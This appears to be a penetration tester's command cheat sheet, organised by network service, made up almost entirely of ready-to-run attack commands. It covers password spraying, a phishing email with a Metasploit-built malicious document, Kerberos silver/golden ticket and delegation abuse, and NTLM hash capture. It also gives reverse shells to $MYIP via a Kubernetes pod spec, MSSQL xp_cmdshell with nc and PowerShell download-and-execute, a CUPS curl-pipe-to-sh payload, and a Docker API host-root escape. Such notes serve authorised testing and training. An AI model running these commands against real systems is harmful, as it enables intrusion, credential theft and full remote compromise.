/usr/bin/telegram2john
/usr/bin/truecrypt2john
/usr/bin/vmx2john
/usr/sbin/zip2john

+---------- Hashcat ----------+
hashcat -h | grep -A 475 "Hash modes" | grep -i 'kerberos'
hashcat -h | grep -A 475 "Hash modes" | grep -i 'ntlm'
hashcat -h | grep -A 475 "Hash modes" | grep -i 'shadow'
hashcat -h | grep -A 475 "Hash modes" | grep -i 'descrypt'
hashcat -h | grep -A 475 "Hash modes" | grep -i 'office'
hashcat -h | grep -A 475 "Hash modes" | grep -i 'bcrypt'

cd /mnt/c/hashcat; hashcat.exe -m 19700 hashes $(wslpath -w $rockyou)

0 	MD5
100	SHA1
1400	SHA256
1700	SHA512
500 	md5crypt
1800 	sha512crypt
7400 	sha256crypt
1500 	descrypt
3200 	bcrypt
1000 	NTLM
3000 	LM
5500 	NetNTLMv1
5600 	NetNTLMv2
400     phpass (WordPress, Joomla, phpBB)
18200	Kerberos 5 TGS-REP etype 17
18300	Kerberos 5 TGS-REP etype 18
13100 	Kerberos 5 TGS-REP etype 23
7500 	Kerberos 5 AS-REQ Pre-Auth etype 23
15300 	DPAPI masterkey
15900 	DPAPI domain backupkey
2100	Domain Cached Credentials (DCC)
1100	Domain Cached Credentials 2 (DCC2)
11300	MSSQL 2012+
13200	AxCrypt
13400 	KeePass
12500 	RAR3-hp
13000 	RAR5
13600 	WinZip
17220 	7-Zip
18300 	BitLocker
13711 	VeraCrypt
9400	MS Office 2007
9500	MS Office 2010
9600	MS Office 2013

+---------- Word Count Wordlist ----------+
wc -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou*.txt

[*] (21) FTP
+---------- Spray Service ----------+
(hydra -I ftp://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)

+---------- List Files ----------+
nxc ftp "$TARGET" -u '$USERNAME' -p '$PASSWORD' --ls

+---------- Download Directory ----------+
wget ftp://$TARGET --ftp-user='$USERNAME' --ftp-password='$PASSWORD' -np -nH -m -q -P ftp

+---------- Upload File ----------+
curl ftp://$TARGET -u '$USERNAME':'$PASSWORD' -T filename.txt

+---------- Login to Service ----------+
ftp '$USERNAME'@"$TARGET"
anonymous
ls -a
binary
ascii
get file.txt -

[*] (22) SSH
+---------- Spray Service ----------+
(hydra -I ssh://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)

+---------- View Types ----------+
ssh -Q key

+---------- Remove Keys ----------+
ssh-add -D

+---------- Create Keys ----------+
ssh-keygen -t ed25519 -f ssh -N ''; mv ssh ~/.ssh/ssh.key; chmod 600 ~/.ssh/ssh.key; cat ssh.pub | awk '{print $1 " " $2}' > /Upload/ssh.pub
ssh-keygen -t rsa -f ssh -N ''; mv ssh ~/.ssh/ssh.key; chmod 600 ~/.ssh/ssh.key; cat ssh.pub | awk '{print $1 " " $2}' > /Upload/ssh.pub

+---------- Add Public Key to Authorized Keys ----------+
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDAS3I0GV78pbzK7Kd3m44tFBbqX1sXRpCv6LPjle3yW root@hostname' > TARGET > ~/.ssh/authorized_keys

+---------- Login to Service ----------+
sshuttle --ssh-cmd "ssh -i $HOME/.ssh/id_ed25519" -r $USERNAME@$TARGET 0.0.0.0/0 -v
ssh $USERNAME@$TARGET -i id_ed25519 -oHostKeyAlgorithms=+ssh-ed25519 -oPubkeyAcceptedKeyTypes=+ssh-ed25519
ssh $USERNAME@$TARGET -i id_rsa -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa
ssh $USERNAME@$TARGET -i id_dsa -oHostKeyAlgorithms=+ssh-dss -oPubkeyAcceptedKeyTypes=+ssh-dss

+---------- Port Forwarding ----------+
sshuttle --ssh-cmd "ssh -i $HOME/.ssh/id_ed25519" -r $USERNAME@$TARGET 0.0.0.0/0 -v
ssh $USERNAME@$TARGET -i id_ed25519 -L 33060:Localhost:33060 -L 5000:Localhost:5000
ssh $USERNAME@$TARGET -i id_rsa -L 33060:Localhost:33060 -L 5000:Localhost:5000
ssh $USERNAME@$TARGET -i id_dsa -L 33060:Localhost:33060 -L 5000:Localhost:5000

+---------- Vault ----------+
vault secrets enable ssh
vault list ssh/roles
vault write ssh/roles/root default_user=root key_type=otp cidr_list=0.0.0.0/0
vault write ssh/creds/root ip=$TARGET
ssh root@$TARGET # key xxxxxxxxx-xxxx-xxxx-xxxxxxxxx

[*] (23) Telnet
+---------- Spray Service ----------+
(hydra -I telnet://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)

+---------- Login to Service ----------+
telnet --user '$USERNAME' $TARGET

[*] (25) SMTP
+---------- Search ----------+
nmap -p 25 --script="smtp* and not brute" --script-args "smtp-enum-users.methods={VRFY},userdb=/usr/share/nmap/nselib/data/usernames.lst" $TARGET

+---------- Create Malicious File ----------+
rlwrap msfconsole -q -x 'use exploit/windows/fileformat/office_word_hta; set SRVHOST tun0; set SRVPORT 8888; set LHOST tun0; set LPORT 7788; set FILENAME file.doc; run'

+---------- Send ----------+
swaks \
        --to administrator@$DOM \
        --from $USERNAME@$DOM \
        --h-Subject "Important Document" \
        --body "This is the document you asked for. Thanks again" \
        --attach "$HOME"/.msf4/local/file.doc \
        --server $TARGET \
        -a NTLM -au '$USERNAME' -ap '$PASSWORD'

sendemail \
        -s $TARGET \
        -f "Admin Team <admin@$DOM>" \
        -t career@$DOM \
        -o tls=no \
        -u "Subject: Important Document" \
        -m "This is the document you asked for. Thanks again" \
        -a "$HOME"/.msf4/local/file.doc

[*] (53) DNS
dig axfr @$TARGET $DOM

[*] (79) Finger
finger '$USERNAME'@$TARGET
while read -r user; do finger "$user"@$TARGET; done < usernames

[*] (88) Kerberos
+---------- .ccache ----------+
impacket-getTGT $DOM/'$USERNAME' -hashes :8846F7EAEE8FB117AD06BDD830B7586C; kcme

+---------- Kerberos .ccache Negotiation ----------+
impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request
impacket-findDelegation -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
impacket-addcomputer -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -computer-name mypc -computer-pass '123qweasdF!'
impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -action write -delegate-from mypc$ -delegate-to DC$
impacket-getTGT $DOM/'mypc$':'123qweasdF!'; kcme
impacket-getST $DOM/mypc$ -k -no-pass -impersonate administrator -spn "cifs/$DC"; mv *administrator@*.ccache administrator.ccache; kcme
impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
impacket-getTGT $DOM/'administrator' -hashes ':'; kcme
evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
evil-winrm -i $TARGET -u administrator -H ''

impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '123qweasdF!'
impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newpass '123qweasdF!' -p kpasswd -reset
impacket-changepasswd -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -newhashes :$(impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs)
while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request-user '$user'; done < usernames

+---------- Silver Ticket ----------+
-->> Domain SID
bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(ObjectClass=user)(objectSid=*)(!(ObjectClass=foreignSecurityPrincipal)))" --attr objectSid | grep -avE 'nTSecurityDescriptor:|distinguishedName:' | cut -d ' ' -f 2 | sed 's/-[0-9]\+$//' | sort -u | sed '/^$/d' | tee silver-ticket

-->> Service Principal Name
impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request | awk '{print $1}' | grep -vE 'Impacket|\$krb5|Service|----|^$|\[' | cut -d '/' -f 1 >> silver-ticket; cat silver-ticket

-->> Service Account Password Hash
echo -n '$PASSWORD' | iconv -t UTF-16LE | openssl dgst -md4 | cut -d ' ' -f 2 | sed 's/.*/\U&/' >> silver-ticket; cat silver-ticket

-->> Create Ticket
cat silver-ticket | { read a; read _; read c; impacket-ticketer -domain $DOM -domain-sid "$a" -spn "cifs/$DC" -nthash "$c" administrator 2>/dev/null; }; kcme

+---------- Golden Ticket ----------+
impacket-goldenPac -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$DC


[*] (135) RPC
rpcclient -U '$USERNAME'%'$PASSWORD' $TARGET -c "enumdomusers"
rpcclient -U '$USERNAME'%'$PASSWORD' $TARGET -c "lsaquery"
rpcclient -U '$USERNAME'%'$PASSWORD' $TARGET -c "querydispinfo" | grep -oP 'Account:.*' | sed 's/Name:.*Desc:/Desc:/'

for host in $(cat hosts_); do echo "================[   $host   ]==============="; rpcclient -U "" $host -N -c "enumdomusers"; done
for host in $(cat hosts_); do rpcclient -U "" $host -N -c "enumdomusers"; done | grep -oP 'user:\[\K[^]]+'

[*] (161) SNMP
+---------- Spray Service ----------+
(hydra -I snmpv2c://$TARGET -P /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -t15 2>/dev/null &)

+---------- Read Service ----------+
snmp-check $TARGET -c COMMUNITY_STRING -v 2c

[*] (389) LDAP
+---------- Spray Service ----------+
(hydra -I ldap2://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)

+---------- Visualise LDAP ----------+
godap $TARGET -d $DOM -t ldap/$DC -k

+---------- Domain SID ----------+
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --get-sid

+---------- Trusted For Delegation ----------+
nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success --trusted-for-delegation

+---------- Other Attacks ----------+
nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success
nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success -k
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' -M get-desc-users
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(servicePrincipalName=*)" "cn sAMAccountName servicePrincipalName"
nxc ldap $TARGET --dns-server $TARGET -u usernames -p passwords --continue-on-success --kerberoasting krb5-hashes
nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --dc-list --query "(SAMAccountType=805306369)" "SAMAccountName"
nxc ldap $TARGET -u '$USERNAME' -p '$PASSWORD' --query "(SAMAccountType=805306369)" "SAMAccountName" | awk '{print $6}' | grep '\$' > machines | sed 's/.$//' | tr '[:upper:]' '[:lower:]' > machines_pw; nxc smb $TARGET -u machines -p machines_pw | grep -oP '\[-\].*TRUST_ACCOUNT.*' | while read line; do echo -e "\e[1;33m$line <--- CHANGE PASSWORD NOW\!\e[0m"; done

[*] (445) SMB
+---------- Spray Service ----------+
(hydra -I smb://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
(hydra -I smb2://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)

+---------- Banner ----------+
nmap $TARGET -sS -T5 --script="smb*protocols,smb*security-mode" -p445

+---------- Check Shares ----------+
nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --shares --use-kcache

+---------- Spider Share for Files ----------+
NXCSPIDER=$(nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' -M spider_plus | grep -oP '(?<=Saved share-file metadata to ")[^"]+');cat $NXCSPIDER | grep -vE 'epoch|size' | sed -E 's/[{}\",:]//g' | sed '/^        $/d' | tee smbfiles_$USERNAME

+---------- Download Files Locally ----------+
mkdir smb; smbclient //$TARGET/SHARE_NAME -U '$USERNAME'%'$PASSWORD' -D . -c 'lcd smb; recurse; prompt; mget *'

+---------- Capture NTLMv2 ----------+
sudo responder -I tun0 -v
ntlm_theft.py --generate all -s $MYIP -f file; smbclient //$TARGET/'SHARE NAME' -D 'DIRECTORY/FOLDER' -U 'anonymous'%'' -c 'lcd file; recurse; prompt; mput *'
echo -n '[shell]\nCommand=2\nIconFile=\\$MYIP\\responder\\t.ico\n[Taskbar]\nCommand=ToggleDesktop' > file.scf

[*] (500) IKE
ike-scan -M -A $TARGET --pskcrack=ike_hashes.txt
psk-crack -d $rockyou ike_hashes.txt

[*] (512-514) RSERVICES
+---------- Spray Service ----------+
(hydra -I rlogin://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)

+---------- Allow All Connections ----------+
echo '+ +' > ~/.rhosts; chmod 600 ~/.rhosts

+---------- Login to Service ----------+
rsh -l $USERNAME $TARGET
rlogin -l $USERNAME $TARGET

+---------- Execute Commands ----------+
rsh -l $USERNAME $TARGET cat /etc/passwd

[*] (631) IPP
evilcups.py $MYIP $TARGET 'bash -c "curl $MYIP:53/resh|sh"'
https://$TARGET:631/printers
Pwned_Printer > Print Test Page

[*] (10249-10250) Kubelet
+---------- View Pods ----------+
kubeletctl -s $TARGET pods

+---------- Execute Commands ----------+
kubeletctl -s $TARGET run "cat /etc/passwd" --all-pods
kubeletctl -s $TARGET run "cat /etc/passwd" -p $pod -n $namespace -c $container

+---------- Get Token and CA.crt ----------+
pod=nginx; namespace=default; container=nginx
kubeletctl -s $TARGET run "ls -la /run/secrets/kubernetes.io/serviceaccount" -p $pod -n $namespace -c $container
kubeletctl -s $TARGET run "ls -la /var/run/secrets/kubernetes.io/serviceaccount" -p $pod -n $namespace -c $container
kubeletctl -s $TARGET run "ls -la /secrets/kubernetes.io/serviceaccout" -p $pod -n $namespace -c $container
kubeletctl -s $TARGET run "cat /secrets/kubernetes.io/serviceaccout/ca.crt" -p $pod -n $namespace -c $container | tee ca.crt; chmod 600 ca.crt
kubeletctl -s $TARGET run "cat /secrets/kubernetes.io/serviceaccout/token" -p $pod -n $namespace -c $container | tee token; chmod 600 token

+---------- Authenticating to Kubernetes API ----------+
kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) get pod

+---------- Kubernetes Privileges ----------+
kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) auth can-i --list

+---------- Kubernetes Pod Details ----------+
kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) get pod nginx -o yaml
kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) get pod nginx -o yaml | grep -E 'namespace:|image:'

+---------- Kubernetes Create Custom YAML ----------+
apiVersion: v1
kind: Pod
metadata:
  name: my-pod
  namespace: $namespace
spec:
  containers:
  - name: my-pod
    image: nginx:1.14.2
    command: ["/bin/bash"]
    args: ["-c", "/bin/bash -i >& /dev/tcp/$MYIP/5555 0>&1"]
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true

+---------- Kubernetes Create Custom Pod ----------+
kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) apply -f my.yaml
kubectl -s https://$TARGET:8443 --certificate-authority=ca.crt --token=$(cat token) get pod

[*] (1433) MSSQL
+---------- Spray ----------+
(hydra -I mssql://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)

+---------- Bruteforce ----------+
cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f1 | sort -u > /tmp/mssqlusernames
cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt | cut -d: -f2 | sort -u > /tmp/mssqlpasswords
hydra -I mssql://$TARGET -L /tmp/mssqlusernames -P /tmp/mssqlpasswords -e n -t15 2>/dev/null

+---------- Login ----------+
impacket-mssqlclient -k -no-pass -dc-ip $TARGET -target-ip $TARGET $DC
impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET'
impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth

+---------- Impersonate and Links----------+
enum_impersonate
exec_as_login sa
enum_links
sp_serveroption 'SQL02', 'rpc', 'true'
sp_serveroption 'SQL02', 'rpc out', 'true'
use_link "SQL02"
use_link ..
enable_xp_cmdshell
upload /Upload/windows/EfsPotato.exe C:\ProgramData\EfsPotato.exe
upload /Upload/windows/nc.exe C:\ProgramData\nc.exe
xp_cmdshell c:\programdata\EfsPotato.exe "powershell -c \"whoami; arp -a; hostname\""
xp_cmdshell c:\programdata\EfsPotato.exe "powershell -c C:\programdata\nc.exe $MYIP 80 -e cmd"
xp_cmdshell powershell -c "IEX (New-Object Net.WebClient).DownloadString(\"http://$MYIP/resh.ps1\"); resh -Reverse $MYIP -Port 80"

+---------- Get Hash ----------+
sudo responder -I tun0 -v
xp_dirtree \\$MYIP\$;
DB_NAME="master"; sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC xp_dirtree '//$MYIP/RESPONDER';"

+---------- Execute Commands ----------+
-->> Get DB Names
sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -C "SELECT name FROM master.dbo.sysdatabases;" | grep -oP '^name:\s*\K\S+'

-->> Set DB Name
DB_NAME="master"

-->> Query DB
sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;" | grep -Ei 'user'
sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS;" | grep -i -B2 'passw'
sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;" | grep -Ei 'account'
sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;" | grep -Ei 'mail'
sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;" | grep -Ei 'db'
sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT * FROM users;"
sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT @@VERSION AS version, HOST_NAME() AS hostname, SYSTEM_USER AS sys_user;"
sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC xp_cmdshell 'dir C:\ && whoami /user /priv';"

+---------- Proxy MSSQL ----------+
wget https://github.com/0xdf-0xdf/mssqlproxy/raw/refs/heads/python3/mssqlclient.py
wget https://github.com/DaddyBigFish/mssqlproxy/releases/download/dlls/Microsoft.SqlServer.Proxy.dll
wget https://github.com/DaddyBigFish/mssqlproxy/releases/download/dlls/reciclador.dll
python3 mssqlclient.py '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET
enable_ole
upload reciclador.dll C:\programdata\reciclador.dll
exit
python3 mssqlclient.py '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET -check -reciclador 'C:\programdata\reciclador.dll'
python3 mssqlclient.py '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET -start -reciclador 'C:\programdata\reciclador.dll'
echo 'socks5  127.0.0.1 1337' | sudo tee -a /etc/proxychains.conf
proxychains4 evil-winrm -i 127.0.0.1 -u $USERNAME -p $PASSWORD

[*] (1521) OracleTNS
+---------- Find Service Name ----------+
sudo odat snguesser -s $TARGET

+---------- Find Valid Creds ----------+
echo 'c' | sudo odat passwordguesser -s $TARGET -n XE

+---------- Execute Commands ----------+
sudo odat dbmsscheduler -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --cmd-exe --exec whoami

+---------- SQL Shell and Queries----------+
sudo odat search -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --sysdba --sql-shell
SELECT * FROM v$version
SELECT * FROM user_role_privs
SELECT * FROM user_sys_privs
SELECT * FROM user_users;
SELECT username FROM all_users
SELECT table_name FROM all_tables
SELECT * FROM tab
SELECT * FROM EMPLOYEES

+---------- Download Files ----------+
sudo odat utlfile -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getFile 'C:\' 'secret.txt' output
sudo odat utlfile -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getFile '/etc' 'passwd' output
sudo odat dbmsxslprocessor -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getFile 'C:\' 'secret.txt' output; cat output
sudo odat dbmsxslprocessor -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --getFile '/etc' 'passwd' output; cat output

+---------- Upload Files ----------+
sudo odat utlfile -s $TARGET -n XE -U '$USERNAME' -P '$PASSWORD' --putFile 'C:\ProgramData\' '' upload.file

[*] (2049) NFS
+---------- List Mounts ----------+
showmount -e $TARGET; mkdir nfs 2>/dev/null

+---------- Version Check ----------+
for v in 2 3 4; do sudo mount -t nfs -o vers=$v,nolock $TARGET:/DIRECTORY ./nfs && echo "vers=$v SUCCESS" && sudo umount ./nfs || echo "vers=$v FAILED"; done

+---------- Mount NFS, List Files ----------+
sudo mount -t nfs -o vers=3,nolock "$TARGET":"/DIRECTORY" "./nfs"
sudo tree -puga "./nfs/"

+---------- Unmount NFS ----------+
sudo umount --lazy "./nfs"; rm -rf "./nfs"

+---------- Copy Files to Current Folder ----------+
sudo cp -r ./nfs/. .

+---------- Open Files as Sudo ----------+
sudo open file.txt
sudo open file.png

+---------- Add User for Reading Files ----------+
sudo adduser -u 1002 mntuser
sudo su mntuser
setpriv --reuid=1002 --regid=1002 --clear-groups -- ls -laR

[*] (2375) Docker
+---------- List Images ----------+
curl -s http://$TARGET:2375/images/json | jq -r .[].RepoTags[]
alpine:latest

+---------- Create Image ----------+
curl -s -X POST http://10.129.121.211:2375/images/create?fromImage=alpine&tag=latest

+---------- List Containers ----------+
(echo -e "ID\tSTATE\tIMAGE\tIP"; curl -s http://$TARGET:2375/containers/json?all=true | jq -r '.[] | [.Id, .State, .Image, (.NetworkSettings.Networks | to_entries[0].value.IPAddress)] | @tsv') | column -t

+---------- Create Container using Image and Start ----------+
containerID=$(curl -s -X POST http://10.129.121.211:2375/containers/create -H "Content-Type: application/json" -d '{"Image":"alpine","Cmd":["sleep", "400"],"HostConfig":{"Binds":["/:/mnt"]}}' | jq -r .Id); curl -s -X POST http://10.129.121.211:2375/containers/"$containerID"/start; curl -s -X POST http://10.129.121.211:2375/containers/"$containerID"/exec -H "Content-Type: application/json" -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["chroot","/mnt","sh"]}'

+---------- Start Container ----------+
containerID=f3f61958a8f66f50f2138af84d85fdafe6e1e65ddd36fdd9fa27acc4cae57d96; curl -s -X POST http://10.129.121.211:2375/containers/"$containerID"/start; curl -s -X POST http://10.129.121.211:2375/containers/"$containerID"/exec -H "Content-Type: application/json" -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["chroot","/mnt","sh"]}'

+---------- Execute Command ----------+
commandID=$(curl -s -X POST http://$TARGET:2375/containers/"$containerID"/exec -H "Content-Type: application/json" -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-c","cat /mnt/etc/passwd; ls -la /mnt"]}' | jq -r .Id); curl -s -X POST http://$TARGET:2375/exec/"$commandID"/start -H "Content-Type: application/json" -d '{"Detach":false,"Tty":true}'

+---------- Remove Containers ----------+
curl -s -X DELETE http://$TARGET:2375/containers/7d9f2df890e2ce4a9c8342a64c33c01755b800b2c6b7b6106fce93fe056da256?force=true

[*] (3306) MySQL
+---------- Spray Service ----------+
(hydra -I mysql://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)

+---------- Bruteforce Using Defaults ----------+
cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt | cut -d: -f1 | sort -u > /tmp/mysqlusernames
cat /usr/share/wordlists/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt | cut -d: -f2 | sort -u > /tmp/mysqlpasswords
hydra -I mysql://$TARGET -L /tmp/mysqlusernames -P /tmp/mysqlpasswords -e n -t15 2>/dev/null

+---------- Executing Queries ----------+
mysql -h localhost -u root --skip-ssl -p'root' -e 'show databases;'
mysql -h localhost -u $USERNAME --skip-ssl -p'$PASSWORD' -e 'show databases;'
mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT table_schema,table_name,column_name FROM information_schema.columns" | grep 'passw'
mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "USE db_name; SELECT * FROM users\G;" | grep -Ei 'name|passw'
mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT table_schema,table_name FROM information_schema.tables;" | grep -E 'user'
mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT table_schema,table_name FROM information_schema.tables;" | grep -E 'account'
mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT table_schema,table_name FROM information_schema.tables;" | grep -E 'mail'
mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT table_schema,table_name FROM information_schema.tables;" | grep -E 'db'
mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT @@version, @@hostname, user();"
mysql -h "$TARGET" -u $USERNAME --skip-ssl -p'$PASSWORD' -e "SELECT LOAD_FILE('/etc/passwd')\G;"

[*] (3389) RDP
+---------- Spray Service ----------+
(hydra -I rdp://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)

+---------- Login to Service ----------+
xfreerdp3 /v:'$TARGET' /d:'' /u:'' /p:'' /cert:ignore /sec:nla /tls:seclevel:0 +auto-reconnect +clipboard +drive:Downloads,"/Upload"
xfreerdp3 /v:'$TARGET' /d:'$DOM' /u:'$USERNAME' /p:'$PASSWORD' /cert:ignore /sec:nla /tls:seclevel:0 +auto-reconnect +clipboard +drive:Downloads,"/Upload"

[*] (5985) WINRM
evil-winrm -i "$TARGET" -u '$USERNAME' -p '$PASSWORD'
evil-winrm -i "$TARGET" -u '$USERNAME' -H '$HASH'

# Information Gathering (Pre-creds)
## Create Custom Usernames List
username-anarchy --input-file names --select-format first,flast,f.last,first.last,firstlast | tee usernames_custom
username-anarchy Joe Kerr --select-format first,flast,f.last,first.last,firstlast | tee usernames_custom

## Create Custom Passwords List
sudo kwp -z /usr/local/bin/basechars/full.base /usr/local/bin/keymaps/en-us.keymap /usr/local/bin/routes/2-to-16-max-3-direction-changes.route > /usr/share/wordlists/keywalk.txt
cewler -d 0 http://$TARGET/ -r 50
psudohash.py -w Password -o passwords_custom_password
spraygen.py --type seasons --mode years --year_start $(($(date +%Y)-1)) --iter ascii -p -o passwords_custom_seasons_1_year
spraygen.py --type seasons --mode years --year_start $(($(date +%Y)-5)) --iter ascii -p -o passwords_custom_seasons_5_years
spraygen.py --type seasons --mode years --year_start $(($(date +%Y)-10)) --iter ascii -p -o passwords_custom_seasons_10_years
psudohash.py -w Password -cpo -cpa -ap '!,?,%' -o passwords_custom_password_extended
psudohash.py -w Spring,Summer,Autumn,Winter,Fall -y $(($(date +%Y)-1))-$(date +%Y) -o passwords_custom_seasons_1_year_extended
psudohash.py -w Spring,Summer,Autumn,Winter,Fall -y $(($(date +%Y)-5))-$(date +%Y) -o passwords_custom_seasons_5_years_extended
psudohash.py -w Spring,Summer,Autumn,Winter,Fall -y $(($(date +%Y)-10))-$(date +%Y) -o passwords_custom_seasons_10_years_extended

## Sorting Lists
cat usernames | sort -u | tee usernames
cat passwords | sort -u | tee passwords
cat pwned | sort -u | sort -k5,5

## Web
bannerme
curl -si $TARGET | grep -oP '(?<=https?://)[^/\s]+' | cut -d '"' -f1
echo | openssl s_client -connect $TARGET:443 2>/dev/null | awk '/subject=|issuer=/'
domme ://$TARGET
echo "$TARGET $DOM" | sudo tee -a /etc/hosts # Windows: C:\Windows\System32\drivers\etc\hosts
creds search pfsense
creds search tomcat
URL=http://$DOM; whatweb $URL; nuclei -u $URL
dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --exclude-sizes 0 --exclude-status 404 --recursive --crawl -t 50 -o dirsearch.txt --format json -w /usr/share/wordlists/assetnote/assetnote_directories.txt -u ://$DOM
ffuf -H "Host: FUZZ.$DOM" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fc 404 -t 50 -rate 5000 -fs 0 -fw 0 -u ://$DOM
portnock $TARGET 3456 8234 62431 -v
while true; do ssltest.py $TARGET |grep -v '00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00' || true; sleep 2; done

## Infrastructure
nxc smb hosts_ -u 'anonymous' -p '' --shares
nxc ftp hosts_ -u 'anonymous' -p '' --ls
cat computers | cut -d '$' -f1 > passwords_computers
